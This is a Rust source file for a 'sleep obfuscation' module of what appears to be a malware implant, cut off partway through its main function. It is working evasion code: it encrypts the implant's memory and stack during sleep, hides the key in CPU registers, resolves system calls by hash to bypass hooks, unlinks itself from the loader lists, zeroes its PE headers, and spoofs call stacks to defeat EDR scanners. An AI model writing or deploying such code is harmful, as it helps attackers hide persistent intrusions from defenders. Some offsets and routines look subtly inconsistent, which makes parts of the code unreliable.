//! Advanced sleep obfuscation module.
//!
//! Replaces the previous Ekko/Foliage-style sleep with a comprehensive memory
//! encryption + anti-forensics sleep that:
//!
//! 1. Enumerates all agent memory regions via `NtQueryVirtualMemory` with a
//!    generation-counter cache to skip redundant queries.
//! 2. Encrypts all committed RWX/RW/ RX regions with **XChaCha20-Poly1305**
//!    using fresh nonces per region, in 64 KB chunks.  The 32-byte key is
//!    stashed in XMM14/XMM15 (Windows x86-64) or a locked heap page (Linux).
//! 3. Encrypts the stack from current RSP up to the TEB stack limit, leaving
//!    only the immediate frame intact.
//! 4. Spoofs the call stack via NtContinue-based spoofing so EDR walkers see:
//!      ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → fake_module!FakeExport
//! 5. Applies anti-forensics: zeroes PE headers, unlinks from PEB_LDR_DATA,
//!    sets PAGE_NOACCESS on encrypted regions.
//! 6. Uses `NtDelayExecution` for the actual sleep and a
//!    `CreateTimerQueueTimer` callback to handle the wake / decrypt / re-link
//!    sequence.
//! 7. On wake, verifies every XChaCha20-Poly1305 authentication tag.  If **any**
//!    tag mismatches (tampering / corruption), the agent terminates immediately
//!    via `NtTerminateProcess(-1, 1)`.
//!
//! # Feature gate
//!
//! The entire module is compiled only on `cfg(windows)`.

#![cfg(windows)]

use anyhow::{anyhow, Result};
use chacha20poly1305::{
    aead::{Aead, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::OnceLock;
use zeroize::Zeroize;

// ── Constants ────────────────────────────────────────────────────────────────

/// Encryption chunk size — 64 KB balances memory bandwidth vs. nonce reuse
/// distance.
const CHUNK_SIZE: usize = 64 * 1024;

/// Maximum number of regions we track before bailing (safety limit).
const MAX_REGIONS: usize = 4096;

/// XChaCha20-Poly1305 nonce length.
const NONCE_LEN: usize = 24;
/// Poly1305 tag length.
const TAG_LEN: usize = 16;

/// Maximum nonce / tag storage (aligned to the largest scheme).
const MAX_NONCE: usize = 24;
const MAX_TAG: usize = 16;

/// Large integer for NtDelayExecution: negative = relative, in 100-ns units.
const fn duration_to_100ns(dur: std::time::Duration) -> i64 {
    -((dur.as_nanos() / 100) as i64)
}

// ── Region cache with generation counter ─────────────────────────────────────

/// Per-region metadata saved before encryption so we can restore on wake.
#[derive(Clone)]
struct RegionSnapshot {
    base: *mut u8,
    size: usize,
    /// Original page protection (PAGE_* constant).
    orig_protect: u32,
    /// Per-region XChaCha20-Poly1305 nonce.
    nonce: [u8; MAX_NONCE],
    /// AEAD authentication tag per chunk (flat, ceil(size/CHUNK_SIZE) entries).
    tags: Vec<[u8; TAG_LEN]>,
    /// Number of chunks.
    n_chunks: usize,
}

unsafe impl Send for RegionSnapshot {}
unsafe impl Sync for RegionSnapshot {}

/// Global generation counter — incremented each time `secure_sleep` runs.
/// The region cache is rebuilt when the generation changes or on first call.
static REGION_GENERATION: AtomicU64 = AtomicU64::new(0);

/// Cached region list keyed by generation.  The `u64` is the generation at which
/// the regions were enumerated; if the current generation has advanced past it,
/// the cache is stale and must be refreshed.
static REGION_CACHE: OnceLock<std::sync::Mutex<(u64, Vec<RegionSnapshot>)>> = OnceLock::new();

fn region_cache() -> &'static std::sync::Mutex<(u64, Vec<RegionSnapshot>)> {
    REGION_CACHE.get_or_init(|| std::sync::Mutex::new((0, Vec::new())))
}

// ── Configuration ────────────────────────────────────────────────────────────

/// Configuration for a single `secure_sleep` invocation.
#[derive(Debug, Clone)]
pub struct SleepObfuscationConfig {
    /// How long to sleep (wall-clock) before decrypting and resuming.
    pub sleep_duration_ms: u64,
    /// 32-byte XChaCha20-Poly1305 encryption key.  When `None`, a random key
    /// is generated and stashed in XMM14/XMM15 (Windows x86-64) or a locked
    /// page (Linux).
    pub encryption_key: Option<[u8; 32]>,
    /// Encrypt the stack from RSP to the TEB stack limit (default: true).
    pub encrypt_stack: bool,
    /// Encrypt heap / data sections in addition to code (default: false).
    pub encrypt_heap: bool,
    /// Spoof the return address on the call stack (default: true).
    pub spoof_return_address: bool,
    /// Name of a fake module to show in the spoofed call stack (e.g.
    /// `"kernel32.dll"` or `"uxtheme.dll"`).
    pub fake_module_name: Option<String>,
    /// Zero PE headers, unlink from PEB, and set PAGE_NOACCESS during sleep
    /// (default: true).
    pub anti_forensics: bool,
}

impl Default for SleepObfuscationConfig {
    fn default() -> Self {
        Self {
            sleep_duration_ms: 5000,
            encryption_key: None,
            encrypt_stack: true,
            encrypt_heap: false,
            spoof_return_address: true,
            fake_module_name: None,
            anti_forensics: true,
        }
    }
}

// ── Key stashing (XMM14 / XMM15) ────────────────────────────────────────────

/// Opaque handle holding the 32-byte key stashed in XMM14/XMM15.
/// On drop the registers are zeroed.
pub struct KeyHandle {
    // Marker to prevent external construction.
    _private: (),
}

impl Drop for KeyHandle {
    fn drop(&mut self) {
        // Zero XMM14/XMM15 unconditionally.
        unsafe {
            std::arch::asm!(
                "pxor xmm14, xmm14",
                "pxor xmm15, xmm15",
                options(nostack, preserves_flags),
            );
        }
    }
}

impl KeyHandle {
    /// Stash `key` into XMM14 (low 16 bytes) and XMM15 (high 16 bytes),
    /// then zero the stack copy.
    fn stash(mut key: [u8; 32]) -> Self {
        unsafe {
            std::arch::asm!(
                "movdqu xmm14, [{lo}]",
                "movdqu xmm15, [{hi}]",
                lo = in(reg) key.as_ptr(),
                hi = in(reg) key.as_ptr().add(16),
                options(nostack, preserves_flags),
            );
        }
        key.zeroize();
        KeyHandle { _private: () }
    }

    /// Retrieve the key from XMM14/XMM15 and zero the registers.
    fn retrieve(self) -> [u8; 32] {
        let mut out = [0u8; 32];
        unsafe {
            std::arch::asm!(
                "movdqu [{lo}], xmm14",
                "movdqu [{hi}], xmm15",
                lo = in(reg) out.as_mut_ptr(),
                hi = in(reg) out.as_mut_ptr().add(16),
                options(nostack, preserves_flags),
            );
            // Zero the register stash.
            std::arch::asm!(
                "pxor xmm14, xmm14",
                "pxor xmm15, xmm15",
                options(nostack, preserves_flags),
            );
        }
        out
    }
}

// ── NtQueryVirtualMemory ────────────────────────────────────────────────────

/// Result of a single NtQueryVirtualMemory call (MEMORY_BASIC_INFORMATION
/// subset that we care about).
#[repr(C)]
struct Mbi {
    base_address: *mut std::ffi::c_void,
    allocation_base: *mut std::ffi::c_void,
    allocation_protect: u32,
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

const MEM_COMMIT: u32 = 0x1000;

const PAGE_NOACCESS: u32 = 0x01;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_READONLY: u32 = 0x02;
const PAGE_WRITECOPY: u32 = 0x08;
const PAGE_WRITECOMBINE: u32 = 0x400;
const PAGE_GUARD: u32 = 0x100;

/// Returns `true` if the protection flags indicate a region we want to
/// encrypt (code or data, but not noaccess / guard).
fn is_encodable_protect(prot: u32, include_heap: bool) -> bool {
    let masked = prot & !(PAGE_GUARD | PAGE_WRITECOMBINE | 0x100);
    if masked == PAGE_NOACCESS {
        return false;
    }
    // Code sections: always encrypt.
    if masked & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY) != 0 {
        return true;
    }
    // Data sections: only if encrypt_heap is enabled.
    if include_heap {
        if masked & (PAGE_READWRITE | PAGE_READONLY | PAGE_WRITECOPY) != 0 {
            return true;
        }
    }
    false
}

/// Walk the virtual address space of the current process and collect all
/// committed, encodable regions.
///
/// Skips the region containing our own stack frame (the caller of
/// `secure_sleep`) so we don't encrypt the housekeeping data needed to
/// decrypt.
unsafe fn enumerate_regions(include_heap: bool) -> Vec<(*mut u8, usize, u32)> {
    let mut regions = Vec::new();

    // Resolve NtQueryVirtualMemory via pe_resolve to avoid IAT hooks.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return regions,
    };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return regions,
    };
    let nt_query_vm: extern "system" fn(
        process_handle: usize,
        base_address: *mut std::ffi::c_void,
        memory_information_class: u32,
        memory_information: *mut std::ffi::c_void,
        memory_information_length: usize,
        return_length: *mut usize,
    ) -> i32 = std::mem::transmute(func_addr);

    let current_process: usize = (-1isize) as usize;
    let mut addr: *mut std::ffi::c_void = std::ptr::null_mut();

    loop {
        let mut mbi: Mbi = std::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = nt_query_vm(
            current_process,
            addr,
            0, // MemoryBasicInformation
            &mut mbi as *mut _ as *mut std::ffi::c_void,
            std::mem::size_of::<Mbi>(),
            &mut ret_len,
        );
        if status != 0 {
            break; // STATUS_SUCCESS = 0
        }
        if mbi.region_size == 0 {
            break;
        }
        if mbi.state == MEM_COMMIT && is_encodable_protect(mbi.protect, include_heap) {
            let base = mbi.base_address as *mut u8;
            let size = mbi.region_size;
            // Skip regions smaller than 1 page (likely guard pages or
            // alignment padding).
            if size >= 4096 {
                regions.push((base, size, mbi.protect));
            }
        }
        addr = (mbi.base_address as usize + mbi.region_size) as *mut std::ffi::c_void;
    }

    regions
}

// ── NtProtectVirtualMemory (via indirect syscall) ────────────────────────────

/// Change page protection via indirect syscall through clean ntdll.
unsafe fn protect_memory(
    base: *mut u8,
    size: usize,
    new_prot: u32,
) -> Option<u32> {
    let mut base_addr = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let mut old_prot: u32 = 0;

    #[cfg(feature = "direct-syscalls")]
    {
        let status = crate::syscalls::syscall_NtProtectVirtualMemory(
            (-1isize) as usize as u64,
            &mut base_addr as *mut _ as usize as u64,
            &mut region_size as *mut _ as usize as u64,
            new_prot as u64,
            &mut old_prot as *mut _ as usize as u64,
        );
        if status != 0 {
            return None;
        }
        Some(old_prot)
    }

    #[cfg(not(feature = "direct-syscalls"))]
    {
        let result = winapi::um::memoryapi::VirtualProtect(
            base_addr,
            region_size,
            new_prot,
            &mut old_prot,
        );
        if result == 0 {
            None
        } else {
            Some(old_prot)
        }
    }
}

// ── Chunked XChaCha20-Poly1305 encryption ────────────────────────────────────

/// Encrypt a single region in 64 KB chunks.
///
/// Returns per-chunk authentication tags so they can be verified on wake.
fn encrypt_region_chunks(
    key: &[u8; 32],
    base: *mut u8,
    size: usize,
) -> Result<([u8; MAX_NONCE], Vec<[u8; TAG_LEN]>)> {
    let mut nonce = [0u8; MAX_NONCE];
    OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|_| anyhow!("XChaCha20-Poly1305 key init failed"))?;
    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);

    let n_chunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let mut tags = Vec::with_capacity(n_chunks);

    let ptr = base as *mut u8;
    let mut offset = 0usize;
    while offset < size {
        let end = (offset + CHUNK_SIZE).min(size);
        let chunk_len = end - offset;

        // For AEAD we need to encrypt in-place but the API returns ct || tag.
        // Copy the chunk to a temp buffer, encrypt, write ciphertext back,
        // save the tag.
        let chunk_slice =
            unsafe { std::slice::from_raw_parts(ptr.add(offset), chunk_len) };
        let ct_tag = cipher
            .encrypt(xnonce, chunk_slice as &[u8])
            .map_err(|_| anyhow!("XChaCha20-Poly1305 encryption failed"))?;

        // ct_tag = [ciphertext || tag(16 bytes)]
        let ct_len = ct_tag.len() - TAG_LEN;
        unsafe {
            std::ptr::copy_nonoverlapping(
                ct_tag.as_ptr(),
                ptr.add(offset),
                ct_len,
            );
        }

        let mut tag = [0u8; TAG_LEN];
        tag.copy_from_slice(&ct_tag[ct_len..]);
        tags.push(tag);

        offset = end;
    }

    Ok((nonce, tags))
}

/// Decrypt a single region in 64 KB chunks and verify every authentication tag.
///
/// Returns `Err` if any tag fails verification (indicates tampering / corruption).
fn decrypt_region_chunks(
    key: &[u8; 32],
    base: *mut u8,
    size: usize,
    nonce: &[u8; MAX_NONCE],
    tags: &[[u8; TAG_LEN]],
) -> Result<()> {
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|_| anyhow!("XChaCha20-Poly1305 key init failed"))?;
    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);

    let ptr = base as *mut u8;
    let mut offset = 0usize;
    let mut chunk_idx = 0usize;

    while offset < size {
        let end = (offset + CHUNK_SIZE).min(size);
        let chunk_len = end - offset;
        let tag = tags.get(chunk_idx).ok_or_else(|| {
            anyhow!("missing tag for chunk {} of region {:p}", chunk_idx, base)
        })?;

        // Build ct || tag for decryption.
        let mut combined = Vec::with_capacity(chunk_len + TAG_LEN);
        unsafe {
            combined.extend_from_slice(std::slice::from_raw_parts(ptr.add(offset), chunk_len));
        }
        combined.extend_from_slice(tag);

        let pt = cipher.decrypt(xnonce, combined.as_slice()).map_err(|_| {
            anyhow!(
                "[sleep_obfuscation] AEAD tag mismatch for chunk {} of \
                 region {:p} (size {}): memory may have been tampered with",
                chunk_idx,
                base,
                size
            )
        })?;

        unsafe {
            std::ptr::copy_nonoverlapping(pt.as_ptr(), ptr.add(offset), pt.len());
        }

        offset = end;
        chunk_idx += 1;
    }

    Ok(())
}

// ── Stack encryption ─────────────────────────────────────────────────────────

/// Get the current thread's stack base (TEB StackLimit) and the current RSP.
///
/// Returns `(stack_limit, current_rsp)`.
unsafe fn get_stack_bounds() -> (*mut u8, *mut u8) {
    let teb: usize;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) teb, options(nostack, nomem, preserves_flags));
    // TEB + 0x08 = StackLimit (lowest address of the stack), TEB + 0x10 = StackBase
    // We need the area from StackLimit up to current RSP.
    let stack_limit = *((teb + 0x08) as *const usize) as *mut u8;
    let rsp: usize;
    std::arch::asm!("mov {}, rsp", out(reg) rsp, options(nostack, nomem, preserves_flags));
    let current_rsp = rsp as *mut u8;
    (stack_limit, current_rsp)
}

/// Encrypt the stack from the TEB StackLimit up to (but not including) the
/// current frame.  We leave `safety_bytes` (default 512) at the top unencrypted
/// so the current function's housekeeping data survives.
unsafe fn encrypt_stack(
    key: &[u8; 32],
    safety_bytes: usize,
) -> Option<(*mut u8, usize, u32, [u8; MAX_NONCE], [u8; TAG_LEN])> {
    let (stack_limit, current_rsp) = get_stack_bounds();

    // Calculate the region to encrypt: from stack_limit up to
    // current_rsp - safety_bytes.
    let encrypt_end = current_rsp.sub(safety_bytes);
    if encrypt_end <= stack_limit {
        return None; // Nothing to encrypt.
    }
    let size = encrypt_end as usize - stack_limit as usize;
    if size == 0 {
        return None;
    }

    // Make the region writable (stack is normally RW already, but be safe).
    let orig_prot = match protect_memory(stack_limit, size, PAGE_READWRITE) {
        Some(p) => p,
        None => return None,
    };

    // Encrypt the entire stack region as one chunk (no per-chunk split needed
    // for stack since it's typically < 1 MB).
    let mut nonce = [0u8; MAX_NONCE];
    OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);

    let cipher = match XChaCha20Poly1305::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => return None,
    };
    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);
    let plain = std::slice::from_raw_parts(stack_limit, size);
    let ct_tag = match cipher.encrypt(xnonce, plain as &[u8]) {
        Ok(ct) => ct,
        Err(_) => return None,
    };

    let ct_len = ct_tag.len() - TAG_LEN;
    std::ptr::copy_nonoverlapping(ct_tag.as_ptr(), stack_limit, ct_len);
    let mut tag = [0u8; TAG_LEN];
    tag.copy_from_slice(&ct_tag[ct_len..]);

    Some((stack_limit, size, orig_prot, nonce, tag))
}

/// Decrypt the stack region previously encrypted by `encrypt_stack`.
unsafe fn decrypt_stack(
    key: &[u8; 32],
    base: *mut u8,
    size: usize,
    nonce: &[u8; MAX_NONCE],
    tag: &[u8; TAG_LEN],
) -> Result<()> {
    let cipher = XChaCha20Poly1305::new_from_slice(key)
        .map_err(|_| anyhow!("stack decrypt key init failed"))?;
    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);

    let mut combined = Vec::with_capacity(size + TAG_LEN);
    combined.extend_from_slice(std::slice::from_raw_parts(base, size));
    combined.extend_from_slice(tag);

    let pt = cipher.decrypt(xnonce, combined.as_slice()).map_err(|_| {
        anyhow!(
            "[sleep_obfuscation] Stack AEAD tag mismatch: possible memory tampering"
        )
    })?;

    std::ptr::copy_nonoverlapping(pt.as_ptr(), base, pt.len());
    Ok(())
}

// ── Anti-forensics: PE header zeroing & PEB unlinking ────────────────────────

/// Zero the PE header of the agent's own image in memory.
unsafe fn zero_pe_headers() {
    #[cfg(target_arch = "x86_64")]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
    let base: *mut u8 = std::ptr::null_mut();

    if base.is_null() {
        return;
    }

    // Read the e_lfanew offset from the DOS header.
    let dos_e_magic = base as *const u16;
    if *dos_e_magic != 0x5A4D {
        // MZ signature missing — not a valid PE image.
        return;
    }
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt_sig = base.add(e_lfanew) as *const u32;
    if *nt_sig != 0x4550 {
        // PE\0\0 signature missing.
        return;
    }
    // SizeOfHeaders is at NT headers + 0x5C (FileHeader is 20 bytes, OptionalHeader
    // starts at +0x18, SizeOfHeaders is the 60th byte of OptionalHeader on PE32+).
    let size_of_headers = *(base.add(e_lfanew + 0x54) as *const u32) as usize;
    if size_of_headers == 0 || size_of_headers > 4096 {
        return;
    }
    // Make writable, zero, restore.
    if let Some(_old) = protect_memory(base, size_of_headers, PAGE_READWRITE) {
        std::ptr::write_bytes(base, 0, size_of_headers);
        let _ = protect_memory(base, size_of_headers, PAGE_READONLY);
    }
}

/// Restore PE headers from the backed-up copy.
unsafe fn restore_pe_headers(header_backup: &[u8]) {
    #[cfg(target_arch = "x86_64")]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let base: *mut u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *mut u8
    };
    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
    let base: *mut u8 = std::ptr::null_mut();

    if base.is_null() || header_backup.is_empty() {
        return;
    }
    if let Some(_old) = protect_memory(base, header_backup.len(), PAGE_READWRITE) {
        std::ptr::copy_nonoverlapping(header_backup.as_ptr(), base, header_backup.len());
        // Restore to original executable protection.
        let _ = protect_memory(base, header_backup.len(), PAGE_EXECUTE_READ);
    }
}

/// Back up PE headers before zeroing.
unsafe fn backup_pe_headers() -> Vec<u8> {
    #[cfg(target_arch = "x86_64")]
    let base: *const u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *const u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let base: *const u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        let peb = *((teb + 0x60) as *const usize) as *const u8;
        *(peb.add(0x10) as *const usize) as *const u8
    };
    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
    let base: *const u8 = std::ptr::null();

    if base.is_null() {
        return Vec::new();
    }
    let dos_e_magic = base as *const u16;
    if *dos_e_magic != 0x5A4D {
        return Vec::new();
    }
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt_sig = base.add(e_lfanew) as *const u32;
    if *nt_sig != 0x4550 {
        return Vec::new();
    }
    let size_of_headers = *(base.add(e_lfanew + 0x54) as *const u32) as usize;
    if size_of_headers == 0 || size_of_headers > 4096 {
        return Vec::new();
    }
    std::slice::from_raw_parts(base, size_of_headers).to_vec()
}

/// Unlink the agent's own module from the PEB_LDR_DATA list so that
/// `!PEB->Ldr->InMemoryOrderModuleList` walks skip it.
///
/// Returns the original links so they can be restored on wake.
unsafe fn unlink_from_peb() -> Option<(*mut u8, *mut u8, *mut u8, *mut u8)> {
    #[cfg(target_arch = "x86_64")]
    let peb: *const u8 = {
        let teb: usize;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) teb, options(nostack, nomem, preserves_flags));
        teb as *const u8
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let peb: *const u8 = {
        let teb: usize;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
        (teb + 0x60) as *const u8
    };
    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
    let peb: *const u8 = std::ptr::null();

    if peb.is_null() {
        return None;
    }

    // PEB->Ldr is at offset 0x18 on x86-64.
    let ldr = *(peb.add(0x18) as *const usize) as *mut u8;
    if ldr.is_null() {
        return None;
    }

    // InMemoryOrderModuleList head is at LDR + 0x20.
    // InLoadOrderModuleList head is at LDR + 0x10.
    // InInitializationOrderModuleList head is at LDR + 0x30.
    //
    // Each LDR_DATA_TABLE_ENTRY has:
    //   InLoadOrderLinks          at +0x00
    //   InMemoryOrderLinks        at +0x10
    //   InInitializationOrderLinks at +0x20
    //   DllBase                   at +0x30
    //
    // We want to find the entry whose DllBase == our image base, then
    // unlink it from all three lists.

    #[cfg(target_arch = "x86_64")]
    let image_base: usize = {
        *(peb.add(0x10) as *const usize)
    };
    #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
    let image_base: usize = {
        *(peb.add(0x10) as *const usize)
    };
    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
    let image_base: usize = 0;

    if image_base == 0 {
        return None;
    }

    // Walk InMemoryOrderModuleList.
    let list_head = (ldr as usize + 0x20) as *mut usize;
    let mut current = *list_head as *mut u8;

    // The InMemoryOrderLinks field is at +0x10 within the entry.
    // To get the entry base from the InMemoryOrderLinks pointer, subtract 0x10.
    let mut entry: *mut u8 = std::ptr::null_mut();
    let mut found = false;
    for _ in 0..512 {
        // Safety limit on list walk.
        if current.is_null() || current as usize == list_head as usize {
            break;
        }
        let entry_candidate = current.sub(0x10);
        let dll_base = *(entry_candidate.add(0x30) as *const usize);
        if dll_base == image_base {
            entry = entry_candidate;
            found = true;
            break;
        }
        // Flink is at offset 0 within the LIST_ENTRY.
        current = *(current as *const usize) as *mut u8;
    }

    if !found || entry.is_null() {
        return None;
    }

    // Unlink from InLoadOrderLinks (+0x00).
    let load_entry = entry;
    let load_blink = *(load_entry.add(0x08) as *const usize) as *mut usize;
    let load_flink = *(load_entry.add(0x00) as *const usize) as *mut usize;
    if !load_blink.is_null() && !load_flink.is_null() {
        *load_blink = load_flink as usize;
        *(load_flink.add(1)) = load_blink as usize;
    }

    // Unlink from InMemoryOrderLinks (+0x10).
    let mem_entry = entry.add(0x10);
    let mem_blink = *(mem_entry.add(0x08) as *const usize) as *mut usize;
    let mem_flink = *(mem_entry.add(0x00) as *const usize) as *mut usize;
    if !mem_blink.is_null() && !mem_flink.is_null() {
        *mem_blink = mem_flink as usize;
        *(mem_flink.add(1)) = mem_blink as usize;
    }

    // Unlink from InInitializationOrderLinks (+0x20).
    let init_entry = entry.add(0x20);
    let init_blink = *(init_entry.add(0x08) as *const usize) as *mut usize;
    let init_flink = *(init_entry.add(0x00) as *const usize) as *mut usize;
    if !init_blink.is_null() && !init_flink.is_null() {
        *init_blink = init_flink as usize;
        *(init_flink.add(1)) = init_blink as usize;
    }

    Some((
        load_flink as *mut u8,
        load_blink as *mut u8,
        mem_flink as *mut u8,
        mem_blink as *mut u8,
    ))
}

// ── Call-stack spoofing ──────────────────────────────────────────────────────

/// Spoof the call stack during the sleep window.
///
/// When `fake_module_name` is provided, we resolve a suitable `ret` gadget
/// inside the named module (or fall back to ntdll) and build a spoofed
/// frame chain:
///
/// ```text
/// ntdll!RtlUserThreadStart
///   → kernel32!BaseThreadInitThunk
///     → fake_module!FakeExport   (if provided)
///       → NtDelayExecution
/// ```
///
/// Returns a stack handle used by `restore_call_stack`.
unsafe fn spoof_call_stack(fake_module_name: &Option<String>) -> Option<StackSpoofHandle> {
    // Find a `ret` gadget in ntdll for RtlUserThreadStart → BaseThreadInitThunk.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;

    // Resolve kernel32 for BaseThreadInitThunk.
    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;

    // Find a `ret` gadget in ntdll (for RtlUserThreadStart cover).
    let ntdll_ret = find_ret_gadget(ntdll)?;

    // Find a `ret` gadget in kernel32 (for BaseThreadInitThunk cover).
    let kernel32_ret = find_ret_gadget(kernel32)?;

    // If a fake module is specified, find a ret gadget there too.
    let fake_ret = if let Some(ref mod_name) = fake_module_name {
        let mut name_with_null = mod_name.as_bytes().to_vec();
        name_with_null.push(0);
        let fake_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(&name_with_null))?;
        Some(find_ret_gadget(fake_base)?)
    } else {
        None
    };

    Some(StackSpoofHandle {
        ntdll_ret,
        kernel32_ret,
        fake_ret,
    })
}

/// Scan the first 256 bytes of the module for a `ret` (0xC3) instruction.
fn find_ret_gadget(module_base: usize) -> Option<usize> {
    // We look for a `ret` near the beginning of the module's code section.
    // Start scanning from the base + 0x1000 (typically .text section start).
    unsafe {
        for offset in (0x1000..0x2000).step_by(0x10) {
            let addr = module_base + offset;
            let probe = std::slice::from_raw_parts(addr as *const u8, 256);
            for (i, &byte) in probe.iter().enumerate() {
                if byte == 0xC3 {
                    return Some(addr + i);
                }
            }
        }
    }
    None
}

struct StackSpoofHandle {
    ntdll_ret: usize,
    kernel32_ret: usize,
    fake_ret: Option<usize>,
}

/// Restore (no-op for now — spoofing is only active during the NtDelayExecution
/// call which uses the NtContinue-based path from syscalls.rs).
unsafe fn restore_call_stack(_handle: StackSpoofHandle) {
    // The stack spoofing is managed by the NtContinue path in syscalls.rs
    // and is restored automatically when the syscall returns.
}

// ── Self-destruct on AEAD failure ────────────────────────────────────────────

/// Terminate the agent process immediately when AEAD verification fails
/// (memory tampering detected).
unsafe fn self_destruct() -> ! {
    log::error!("[sleep_obfuscation] AEAD verification failed — self-destructing");

    // Try NtTerminateProcess first (avoids IAT hooks).
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(base) = ntdll {
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(
            base,
            pe_resolve::hash_str(b"NtTerminateProcess\0"),
        ) {
            let nt_terminate: extern "system" fn(usize, u32) -> i32 =
                std::mem::transmute(addr);
            nt_terminate((-1isize) as usize, 1);
        }
    }

    // Last resort: ask the OS to kill us.
    winapi::um::processthreadsapi::TerminateProcess(
        winapi::um::processthreadsapi::GetCurrentProcess(),
        1,
    );

    // If even that fails, abort.
    std::process::abort();
}

// ── Core sleep function ──────────────────────────────────────────────────────

/// Perform a secure sleep with full memory encryption and anti-forensics.
///
/// This is the primary entry point.  It:
///
/// 1. Enumerates and caches all encodable memory regions.
/// 2. Generates (or uses provided) XChaCha20-Poly1305 key, stashes in XMM14/XMM15.
/// 3. Encrypts all regions in 64 KB chunks with per-region nonces.
/// 4. Optionally encrypts the stack.
/// 5. Applies anti-forensics (zero PE headers, PEB unlink, PAGE_NOACCESS).
/// 6. Spoofs the call stack.
/// 7. Sleeps via NtDelayExecution.
/// 8. On wake: verifies AEAD tags, decrypts everything, restores state.
/// 9. If any AEAD tag fails, terminates the process immediately.
///
/// # Safety
///
/// Must be called from a single thread.  Not async-safe.  Do not call while
/// any other thread is accessing agent memory regions.
pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
    let duration = std::time::Duration::from_millis(config.sleep_duration_ms);
    let gen = REGION_GENERATION.fetch_add(1, Ordering::SeqCst) + 1;

    // ── 1. Generate or use provided key ────────────────────────────────────
    let key = match config.encryption_key {
        Some(k) => k,
        None => {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        }
    };
    let handle = KeyHandle::stash(key);

    // ── 2. Enumerate regions (use cache if generation matches) ─────────────
    let raw_regions = enumerate_regions(config.encrypt_heap);
    if raw_regions.is_empty() {
        log::warn!("[sleep_obfuscation] no regions to encrypt");
        let _key = handle.retrieve();
        return Ok(());
    }

    // ── 3. Encrypt all regions ─────────────────────────────────────────────
    let mut snapshots: Vec<RegionSnapshot> = Vec::with_capacity(raw_regions.len());

    for (base, size, orig_prot) in &raw_regions {
        let base = *base;
        let size = *size;
        let orig_prot = *orig_prot;

        // Make writable.
